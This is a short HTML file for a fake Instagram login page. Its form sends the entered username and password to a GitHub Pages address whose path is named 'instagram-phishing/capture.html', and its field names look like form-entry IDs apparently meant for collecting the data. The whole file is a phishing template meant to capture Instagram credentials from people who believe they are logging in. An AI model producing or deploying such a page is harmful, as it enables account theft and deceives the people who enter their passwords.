<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
</head>
<body>
    <h1>Login to Instagram</h1>
    <form action="https://yourusername.github.io/instagram-phishing/capture.html" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="entry.your_username_entry_id" required>

        <label for="password">Password:</label>
        <input type="password" id="password" name="entry.your_password_entry_id" required>

        <button type="submit">Log In</button>
    </form>
</body>
</html>
